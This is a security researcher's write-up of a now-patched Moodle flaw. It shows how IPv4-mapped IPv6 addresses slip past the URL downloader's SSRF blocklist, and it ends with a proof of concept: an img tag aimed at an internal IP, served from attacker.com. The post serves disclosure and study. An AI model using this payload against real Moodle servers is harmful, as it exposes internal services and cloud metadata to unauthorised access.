## Does Moodle have Full-SSRF by default?

The short answer to this question is a resounding **YES**, but it is considered a feature of the software itself. This feature is available when selecting files, since Moodle includes the feature "URL downloader" that allows you to download images and resources from other external websites.


The primary function responsible for this functionality is `parse_file`, which handles making a HEAD request and GET request to the URL provided by the user and iterating through various HTML tags to extract the URLs of the resources loaded from that URL.

<a href="https://github.com/moodle/moodle/blob/v5.2.1/public/repository/url/lib.php#L168-L192" target="_blank" rel="noopener noreferrer"><code>public/repository/url/lib.php:168-192</code></a>

```php
if ($mainfile && (strstr($info['content_type'], 'text/html') || empty($info['content_type']))) {
    // parse as html
    $htmlcontent = $curl->get($info['url']);
    $ddoc = new DOMDocument();
    @$ddoc->loadHTML($htmlcontent);
    // extract <img>
    $tags = $ddoc->getElementsByTagName('img');
    foreach ($tags as $tag) {
        $url = $tag->getAttribute('src');
        $this->add_image_to_list($info['url'], $url, $list);
    }
    // analyse embedded css (<style>)
    $tags = $ddoc->getElementsByTagName('style');
    foreach ($tags as $tag) {
        if ($tag->getAttribute('type') == 'text/css') {
            $csstoanalyze .= $tag->textContent."\n";
        }
    }
    // analyse links to css (<link type='text/css' href='...'>)
    $tags = $ddoc->getElementsByTagName('link');
    foreach ($tags as $tag) {
        if ($tag->getAttribute('type') == 'text/css' && strlen($tag->getAttribute('href'))) {
            $this->parse_file($info['url'], $tag->getAttribute('href'), $list);
        }
    }
```

Basically, as you can see in the code, it extracts the URLs from the attributes and passes them to the `add_image_to_list` function, and then displays a menu to the user asking which file from those added to the list they want to select for download. There are many ways Moodle extracts these URLs, but all you need to do is use a `<img>` tag with a `src` attribute that points to the URL of the file you want to download.

For example, we can create a simple HTML page with an `img` tag pointing to google.com
```html
<img src="https://google.com">
```
The Moodle bot will access our URL and extract the URL, then provide us with a menu where we can select which web resource we want to download in this case, just the root directory of google.com.

![image 1](assets/img/moodle-ssrf-ipv4-mapped-ipv6/image1.png)

Once you select the files, the Moodle bot retrieves the URL from the list and passes it to the `get_file` function.

<a href="https://github.com/moodle/moodle/blob/v5.2.1/public/repository/lib.php#L1707-L1718" target="_blank" rel="noopener noreferrer"><code>public/repository/lib.php:1707-1718</code></a>

```php
public function get_file($url, $filename = '') {
    global $CFG;

    $path = $this->prepare_file($filename);
    $c = new curl;

    $result = $c->download_one($url, null, array('filepath' => $path, 'timeout' => $CFG->repositorygetfiletimeout));
    if ($result !== true) {
        throw new moodle_exception('errorwhiledownload', 'repository', '', $result);
    }
    return array('path'=>$path, 'url'=>$url);
}
```

This function, in turn, calls the `download_one` function.

<a href="https://github.com/moodle/moodle/blob/main/public/lib/filelib.php#L4137-L4160" target="_blank" rel="noopener noreferrer"><code>public/lib/filelib.php:4137-4160</code></a>

```php
public function download_one($url, $params, $options = array()) {
    $options['CURLOPT_HTTPGET'] = 1;
    if (!empty($params)) {
        $url .= (stripos($url, '?') !== false) ? '&' : '?';
        $url .= http_build_query($params);
    }
    if (!empty($options['filepath']) && empty($options['file'])) {
        // open file
        if (!($options['file'] = fopen($options['filepath'], 'w'))) {
            $this->errno = 100;
            return get_string('cannotwritefile', 'error', $options['filepath']);
        }
        $filepath = $options['filepath'];
    }
    unset($options['filepath']);
    $result = $this->request($url, $options); // Interesting request function
    if (isset($filepath)) {
        fclose($options['file']);
        if ($result !== true) {
            unlink($filepath);
        }
    }
    return $result;
}
```

This finally brings us to the interesting function in this research, the `request` function, which sends the request to download the file. Once the file is downloaded, we can view it in our Moodle files and download it.

Head `google.com` downloaded file:
```html
<!doctype html><html itemscope="" itemtype="http://schema.org/WebPage" lang="es"><head><meta content="Google.es permite acceder a la informaci�n mundial en castellano, catal�n, gallego, euskara e ingl�s." name="description"><!-- sniff all the body of the google.com page-->
```

As you can see, it is possible to perform a Full-SSRF by viewing the response body in any default Moodle installation.

## How is it possible that a Full-SSRF is a feature? does it contains some kind of protection?

But Moodle does have safeguards in place for this feature, just imagine what could happen if Moodle were hosted in the cloud and we tried to connect to 169.254.169.254. For that very reason, Moodle blocks several internal ranges by default so that this feature "cannot be exploited maliciously". I still think this could leak the real IP address of Moodle instances and other services behind proxies like Cloudflare and similar services.

In the HTTP Security menu, the Moodle administrator can choose which IP ranges to block and which ports to allow for requests made using the `request` function.

![image 2](assets/img/moodle-ssrf-ipv4-mapped-ipv6/image2.png)

If you're participating in a bug bounty program and come across a Moodle instance where you can register, I strongly recommend that you try to exploit this SSRF vulnerability against localhost, since for some strange reason many people disable these ranges from the blocklist. You're welcome for the bounty ;)

## How Moodle verifies that my URL isn't from an internal source

Well, to answer this question, we need to go back to the code where we left off in the `request` function.

<a href="https://github.com/moodle/moodle/blob/main/public/lib/filelib.php#L3790-L3812" target="_blank" rel="noopener noreferrer"><code>public/lib/filelib.php:3790-3812</code></a>

```php
protected function request($url, $options = array()) {
    // Reset here so that the data is valid when result returned from cache, or if we return due to a blocked URL hit.
    $this->reset_request_state_vars();

    if ((defined('PHPUNIT_TEST') && PHPUNIT_TEST)) {
        $mockresponse = array_pop(self::$mockresponses);
        if ($mockresponse !== null) {
            $this->info = [ 'http_code' => 200 ];
            return $mockresponse;
        }
    }

    if (empty($this->emulateredirects)) {
        // Just in case someone had tried to explicitly disable emulated redirects in legacy code.
        debugging('Attempting to disable emulated redirects has no effect any more!', DEBUG_DEVELOPER);
    }

    $urlisblocked = $this->check_securityhelper_blocklist($url);
    if (!is_null($urlisblocked)) {
        $this->trigger_url_blocked_event($url, $urlisblocked);
        return $urlisblocked;
    }
// sniff...
```

As you can see, the function calls another function called `check_securityhelper_blocklist`, passing the URL as a parameter. If that function returns a value that is not null, then `trigger_url_blocked_event` is called, preventing the request from being made. Let's take a look at that `check_securityhelper_blocklist` function, it looks like that's where the filtering takes place.

<a href="https://github.com/moodle/moodle/blob/main/public/lib/filelib.php#L3750-L3757" target="_blank" rel="noopener noreferrer"><code>public/lib/filelib.php:3750-3757</code></a>

```php
// Check if the URL is blocked in core curl_security_helper or
// curl security helper that passed to curl class constructor.
// Note, we purposely check the configured helper first,
// as this may be being mocked for unit testing.
if ($this->securityhelper->url_is_blocked($url)) {
    $this->error = $this->securityhelper->get_blocked_url_string();
    return $this->error;
}
```
We see that another function, `url_is_blocked`, is called.

<a href="https://github.com/moodle/moodle/blob/main/public/lib/classes/files/curl_security_helper.php#L86-L122" target="_blank" rel="noopener noreferrer"><code>public/lib/classes/files/curl_security_helper.php:86-122</code></a>

```php
public function url_is_blocked($urlstring, $notused = null) {

    if ($notused !== null) {
        debugging('The $maxredirects parameter of curl_security_helper::url_is_blocked() has been dropped!', DEBUG_DEVELOPER);
    }

    // If no config data is present, then all hosts/ports are allowed.
    if (!$this->is_enabled()) {
        $this->urlblockchecked = true;
        return false;
    }

    // Try to parse the URL to get the 'host' and 'port' components.
    try {
        $url = new \moodle_url($urlstring);
        $parsed['scheme'] = $url->get_scheme();
        $parsed['host'] = $url->get_host();
        $parsed['port'] = $url->get_port();
    } catch (\moodle_exception $e) {
        // Moodle exception is thrown if the $urlstring is invalid. Treat as blocked.
        return true;
    }

    $this->host = $parsed['host'];

    // The port will be empty unless explicitly set in the $url (uncommon), so try to infer it from the supported schemes.
    if (!$parsed['port'] && $parsed['scheme'] && isset($this->transportschemes[$parsed['scheme']])) {
        $parsed['port'] = $this->transportschemes[$parsed['scheme']];
    }

    $this->urlblockchecked = true;
    if ($parsed['port'] && $parsed['host']) {
        // Check the host and port against the allow/block entries.
        return $this->host_is_blocked($parsed['host']) || $this->port_is_blocked($parsed['port']);
    }
    return true;
}
```
Basically, the schema host and port are extracted from the url and passed to another function with an even more interesting name `host_is_blocked`

<a href="https://github.com/moodle/moodle/blob/v5.2.1/public/lib/classes/files/curl_security_helper.php#L152-L207" target="_blank" rel="noopener noreferrer"><code>public/lib/classes/files/curl_security_helper.php:152-207</code></a>

```php
protected function host_is_blocked($host) {
    if (!$this->is_enabled() || empty($host) || !is_string($host)) {
        return false;
    }

    // Fix for square brackets in the 'host' portion of the URL (only occurs if an IPv6 address is specified).
    $host = str_replace(array('[', ']'), '', $host); // RFC3986, section 3.2.2.
    $blockedhosts = $this->get_blocked_hosts_by_category();

    if (ip_utils::is_ip_address($host)) {
        if ($this->address_explicitly_blocked($host)) {
            return true;
        }

        // Only perform a reverse lookup if there is a point to it (i.e. we have rules to check against).
        if ($blockedhosts['domain'] || $blockedhosts['domainwildcard']) {
            // DNS reverse lookup - supports both IPv4 and IPv6 address formats.
            $hostname = gethostbyaddr($host);
            if ($hostname !== $host && $this->host_explicitly_blocked($hostname)) {
                return true;
            }
        }
    } else if (ip_utils::is_domain_name($host)) {
        if ($this->host_explicitly_blocked($host)) {
            return true;
        }

        // Only perform a forward lookup if there are IP rules to check against.
        if ($blockedhosts['ipv4'] || $blockedhosts['ipv6']) {
            // DNS forward lookup - returns a list of only IPv4 addresses!
            $hostips = $this->get_host_list_by_name($host);
            // sniff... every resolved IP is checked and then pinned with CURLOPT_RESOLVE
        }
    } else {
        // Was not something we consider to be a valid IP or domain name, block it.
        return true;
    }

    return false;
}
```

The function has three branches:

- **The host is a domain name.**
- **The host is neither an IP nor a valid domain.**
- **The host is an IP literal.**

Domains are well protected, so the interesting branch is the third one. Let's see what `address_explicitly_blocked` does.

<a href="https://github.com/moodle/moodle/blob/v5.2.1/public/lib/classes/files/curl_security_helper.php#L260-L264" target="_blank" rel="noopener noreferrer"><code>public/lib/classes/files/curl_security_helper.php:260-264</code></a>

```php
protected function address_explicitly_blocked($addr) {
    $blockedhosts = $this->get_blocked_hosts_by_category();
    $iphostsblocked = array_merge($blockedhosts['ipv4'], $blockedhosts['ipv6']);
    return address_in_subnet($addr, implode(',', $iphostsblocked), true);
}
```

It merges the IPv4 and IPv6 rules into one comma-separated string and hands everything to an old function from <a href="https://github.com/moodle/moodle/blob/main/public/lib/moodlelib.php#L8416" target="_blank" rel="noopener noreferrer"><code>public/lib/moodlelib.php:8416</code></a> `address_in_subnet`.

## The root cause: `address_in_subnet`

This function is way older than the SSRF protection. It was originally written to check whether a user IP belongs to a subnet. Take a look at how it decides whether an address is IPv6:

<a href="https://github.com/moodle/moodle/blob/v5.2.1/public/lib/moodlelib.php#L8608-L8696" target="_blank" rel="noopener noreferrer"><code>public/lib/moodlelib.php:8608-8696</code></a>

```php
function address_in_subnet($addr, $subnetstr, $checkallzeros = false) {
    // sniff...
    $addr = cleanremoteaddr($addr, false); // Normalise.
    if ($addr === null) {
        return false;
    }
    $addrparts = explode(':', $addr);

    $ipv6 = strpos($addr, ':'); // Any ':' in the address means IPv6

    foreach ($subnets as $subnet) {
        // sniff...
        if (strpos($subnet, '/') !== false) {
            // sniff...
            if (strpos($ip, ':') !== false) {
                // IPv6.
                if (!$ipv6) {
                    continue;
                }
                // sniff...
            } else {
                // IPv4.
                if ($ipv6) {
                    continue; // <-- An IPv6 address is NEVER compared against an IPv4 rule
                }
                // sniff...
```

It's the same pattern in all three branches of the function: **if the address contains a ":", every IPv4 rule is skipped.** That makes sense when you're comparing a client IP against a subnet. It's a disaster when you're trying to stop an SSRF, because there's a family of IPv6 addresses that are really IPv4 addresses in disguise: **IPv4-mapped IPv6 addresses** ([RFC 4291, section 2.5.5.2](https://datatracker.ietf.org/doc/html/rfc4291#section-2.5.5.2)).

```
::ffff:169.254.169.254   ==   ::ffff:a9fe:a9fe   ==   169.254.169.254
```

Let's walk through it with the AWS metadata IP. First, `cleanremoteaddr` normalizes the address:

<a href="https://github.com/moodle/moodle/blob/v5.2.1/public/lib/moodlelib.php#L8973-L8985" target="_blank" rel="noopener noreferrer"><code>public/lib/moodlelib.php:8973-8985</code></a>

```php
if (strpos($parts[$count-1], '.') !== false) {
    // Legacy ipv4 notation.
    $last = array_pop($parts);
    $ipv4 = cleanremoteaddr($last, true);
    if ($ipv4 === null) {
        return null;
    }
    $bits = explode('.', $ipv4);
    $parts[] = dechex($bits[0]).dechex($bits[1]);
    $parts[] = dechex($bits[2]).dechex($bits[3]);
    $count = count($parts);
    $addr = implode(':', $parts);
}
```

```
::ffff:169.254.169.254  ->  0:0:0:0:0:ffff:a9fe:a9fe
```

The result contains ":", so $ipv6 is truthy. Now compare it against the default blocklist:

<a href="https://github.com/moodle/moodle/blob/v5.2.1/public/admin/settings/security.php#L171-L180" target="_blank" rel="noopener noreferrer"><code>public/admin/settings/security.php:171-180</code></a>

```php
$blockedhostsdefault = [
    '127.0.0.0/8',
    '192.168.0.0/16',
    '10.0.0.0/8',
    '172.16.0.0/12',
    '0.0.0.0',
    'localhost',
    '169.254.169.254',
    '0000::1',
];
```

| Rule                                                           | Type   | Result                                                   |
|---                                                             |---     |---                                                       |
| `127.0.0.0/8`, `192.168.0.0/16`, `10.0.0.0/8`, `172.16.0.0/12` | IPv4   | skipped `if ($ipv6) continue;`                           |
| `0.0.0.0`, `169.254.169.254`                                   | IPv4   | skipped `if ($ipv6) continue;`                           |
| `0000::1`                                                      | IPv6   | compared, `0:0:0:0:0:0:0:1` != `0:0:0:0:0:ffff:a9fe:a9fe` |
| `localhost`                                                    | domain | not used by `address_in_subnet`                          |

That said, any IPv4-mapped IPv6 address would bypass the filter implemented by Moodle, allowing an attacker to exploit this Full-SSRF vulnerability.

## Final Full-SSRF POC
The only thing we need to carry out this proof of concept is an external server that returns HTML containing an `img` tag whose `src` attribute contains the IPv4 address mapped to IPv6 for the internal IP address where you want to make the request.

For this example, I'll use my Docker IP address.

1. Host a web server on a public address reachable by the Moodle instance that answers GET with the SSRF url in the src attribute of a html \<img> tag:

```html
<img src="http://[::ffff:172.17.0.1]/">
```

2. As a normal user: Private files --> Add --> URL downloader --> enter http://attacker.com/ --> Download.

3. Moodle takes the IPv4-mapped IPv6 URL, url_is_blocked() does not block ::ffff:172.17.0.1, and the OS routes it to 172.17.0.1. The internal response is fetched and stored as the "image".

### POC Video

<video src="/assets/img/moodle-ssrf-ipv4-mapped-ipv6/poc.mp4" controls></video>


## Report Timeline

- **2026-07-15** — Reported to Moodle via BugCrowd
- **2026-07-22** — BugCrowd Triagger Marked as Duplicated and not applicable
- **2026-10-13** — Moodle dev change to aplicable and Unresolved state P2
- **2026-10-13** — Fix released in Moodle 5.2.2, 5.1.6, 5.0.9 and 4.5.13 (`MDL-88779`) https://moodle.org/mod/forum/discuss.php?d=482495

I thought it was pretty strange that it was flagged as a duplicate and then a Moodle developer changed it and fixed the vulnerability, I never know if it really was a duplicate, my gut tells me it wasn't, but who knows.

I hope you enjoyed this research and this post ;)